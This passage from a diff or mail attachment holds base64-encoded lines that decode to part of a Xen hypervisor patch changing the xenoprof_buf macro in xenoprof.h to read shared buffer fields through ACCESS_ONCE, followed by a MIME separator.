+c19hY3RpdmUodmNwdS0+ZG9tYWluKSApCiAgICAgICAgICAgICBhY3RpdmVf
+c2FtcGxlcysrOwotLS0gYS94ZW4vaW5jbHVkZS94ZW4veGVub3Byb2YuaAor
+KysgYi94ZW4vaW5jbHVkZS94ZW4veGVub3Byb2YuaApAQCAtNjEsMTIgKzYx
+LDEyIEBAIHN0cnVjdCB4ZW5vcHJvZiB7CiAKICNpZm5kZWYgQ09ORklHX0NP
+TVBBVAogI2RlZmluZSBYRU5PUFJPRl9DT01QQVQoeCkgMAotI2RlZmluZSB4
+ZW5vcHJvZl9idWYoZCwgYiwgZmllbGQpICgoYiktPmZpZWxkKQorI2RlZmlu
+ZSB4ZW5vcHJvZl9idWYoZCwgYiwgZmllbGQpIEFDQ0VTU19PTkNFKChiKS0+
+ZmllbGQpCiAjZWxzZQogI2RlZmluZSBYRU5PUFJPRl9DT01QQVQoeCkgKCh4
+KS0+aXNfY29tcGF0KQotI2RlZmluZSB4ZW5vcHJvZl9idWYoZCwgYiwgZmll
+bGQpICgqKCEoZCktPnhlbm9wcm9mLT5pc19jb21wYXQgPyBcCi0gICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAmKGIpLT5uYXRpdmUu
+ZmllbGQgOiBcCi0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAmKGIpLT5jb21wYXQuZmllbGQpKQorI2RlZmluZSB4ZW5vcHJvZl9i
+dWYoZCwgYiwgZmllbGQpIEFDQ0VTU19PTkNFKCooIShkKS0+eGVub3Byb2Yt
+PmlzX2NvbXBhdCBcCisgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICA/ICYoYiktPm5hdGl2ZS5maWVsZCBcCisgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA6
+ICYoYiktPmNvbXBhdC5maWVsZCkpCiAjZW5kaWYKIAogc3RydWN0IGRvbWFp
+bjsK
+
+--=separator--
